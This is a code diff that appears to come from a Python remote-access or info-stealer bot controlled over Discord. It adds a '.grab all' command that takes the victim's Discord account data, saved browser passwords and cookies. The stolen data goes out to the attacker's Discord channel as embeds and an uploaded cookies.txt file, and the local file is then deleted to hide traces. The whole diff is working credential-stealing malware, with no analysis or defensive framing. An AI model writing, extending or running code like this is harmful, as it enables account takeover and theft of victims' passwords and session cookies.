@@ -86,4 +86,30 @@ elif message.content[:5] == '.grab':
             #.log Grabbed Discord accounts data 
             for account in accounts:
                 reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
-                #.log Sent embed with Discord account data 
+                #.log Sent embed with Discord account data
+        elif message.content[6:] == 'all':
+            await message.channel.send('Grabbing everything... Please wait.')
+            try:
+                accounts = grab_discord.initialize(False)
+                #.log Grabbed Discord accounts data
+                for account in accounts:
+                    reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
+                    #.log Sent embed with Discord account data
+            except: pass
+            try:
+                result = grab_passwords()
+                #.log Grabbed passwords 
+                embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
+                for url in result.keys():
+                    embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
+                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
+                #.log Sent embed with all grabbed passwords
+            except: pass 
+            try:
+                await asyncio.sleep(1)
+                grab_cookies()
+                #.log Grabbed cookies
+                reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
+                #.log Sent message with grabbed cookies 
+                subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
+            except: pass
